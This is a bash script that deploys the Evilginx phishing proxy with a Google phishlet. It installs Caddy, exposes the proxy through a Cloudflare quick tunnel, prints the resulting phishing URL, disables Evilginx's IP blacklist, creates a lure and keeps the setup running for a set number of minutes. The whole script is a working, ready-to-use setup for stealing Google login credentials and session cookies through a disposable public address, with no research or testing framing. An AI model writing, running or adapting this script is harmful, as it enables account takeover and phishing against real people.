#!/usr/bin/env bash
set -euo pipefail
LIMIT=${RUN_LIMIT_MINUTES:-270}
PHISHLETS_DIR="$(pwd)/phishlets"
EVILGINX=/usr/local/bin/evilginx
CLOUDFLARED=/usr/local/bin/cloudflared
CADDY=/usr/local/bin/caddy
if [ "$(id -u)" = "0" ]; then SUDO=""; else SUDO="sudo"; fi

pkill -f evilginx 2>/dev/null || true
pkill -f caddy 2>/dev/null || true

echo "--- install caddy ---"
ASSET=$(curl -sL "https://api.github.com/repos/caddyserver/caddy/releases/latest" | grep -oE 'https://[^"]+_linux_amd64\.tar\.gz' | head -n1)
curl -sL "$ASSET" -o /tmp/caddy.tgz
tar -xzf /tmp/caddy.tgz -C /tmp caddy
$SUDO cp /tmp/caddy /usr/local/bin/caddy
caddy version

echo "--- tunnel -> caddy :9443 ---"
nohup "$CLOUDFLARED" tunnel --url https://127.0.0.1:9443 --no-tls-verify > cloudflared.log 2>&1 &
URL=""
for i in $(seq 1 60); do
  URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' cloudflared.log | head -n1 || true)
  [ -n "$URL" ] && break
  sleep 2
done
[ -n "$URL" ] && echo "PHISH_URL=$URL"
HOST="${URL#https://}"

echo "--- evilginx: config + hostname + enable + create lure ---"
$SUDO mkdir -p /root/.evilginx
echo "{\"phishlets\":{\"google\":{\"enabled\":true,\"hostname\":\"$HOST\",\"unauth_url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"}},\"blacklist\":{\"enabled\":false,\"ip_addresses\":[],\"ip_masks\":[]}}" | $SUDO tee /root/.evilginx/config.json >/dev/null
rm -f /tmp/eg_in; mkfifo /tmp/eg_in
( sleep 7; echo "config domain $HOST"; sleep 1; echo "config ipv4 external 203.0.113.7"; sleep 1; echo "config autocert off"; sleep 1; echo "phishlets hostname google $HOST"; sleep 1; echo "phishlets enable google"; sleep 1; echo "lures create google"; sleep 1; tail -f /dev/null ) > /tmp/eg_in &
"$SUDO" "$EVILGINX" -p "$PHISHLETS_DIR" -developer < /tmp/eg_in 2>&1 | tee evilginx.log &

EG=0
for i in $(seq 1 30); do
  if (exec 3<>/dev/tcp/127.0.0.1/443) 2>/dev/null; then exec 3>&-; EG=1; break; fi
  sleep 2
done
echo "EVILGINX_443=$EG"

echo "--- caddy :9443 -> https://evilginx:443 ---"
cat > /tmp/Caddyfile <<EOF
https://$HOST:9443 {
    tls internal
    reverse_proxy https://127.0.0.1:443 {
        transport http {
            tls_insecure_skip_verify
            tls_server_name $HOST
        }
    }
}
EOF
$SUDO "$CADDY" run --config /tmp/Caddyfile > caddy.log 2>&1 &

BOUND=0
for i in $(seq 1 30); do
  if (exec 3<>/dev/tcp/127.0.0.1/9443) 2>/dev/null; then exec 3>&-; BOUND=1; break; fi
  sleep 2
done
echo "CADDY_9443_BOUND=$BOUND"
sleep 10
echo "--- edge probe ---"
curl -sS -m 20 -o /tmp/edge.out -w 'EDGE_HTTP:%{http_code}\n' "$URL/" 2>&1 || echo "EDGE_PROBE_FAIL"
head -c 200 /tmp/edge.out 2>/dev/null || true
echo ""
echo "--- lure line ---"
grep -iE 'created lure' evilginx.log | tail -n 3 || true

echo "=== streaming evilginx output ==="
trap 'kill %3 %2 %1 2>/dev/null || true' EXIT
for i in $(seq 1 "$((LIMIT * 6))"); do sleep 10; done
